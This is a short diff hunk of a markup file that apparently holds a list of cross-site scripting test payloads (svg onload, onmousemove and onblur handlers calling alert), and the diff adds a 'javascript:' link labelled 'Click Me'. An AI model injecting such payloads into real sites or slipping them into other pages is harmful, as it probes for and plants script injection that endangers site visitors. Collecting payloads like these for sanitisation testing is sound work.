@@ -65,6 +65,7 @@ Here are some ideas to get you started:
 <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 <html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
 <body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+<a href="javascript:alert('XSS')">Click Me</a>
 
 
   </html>
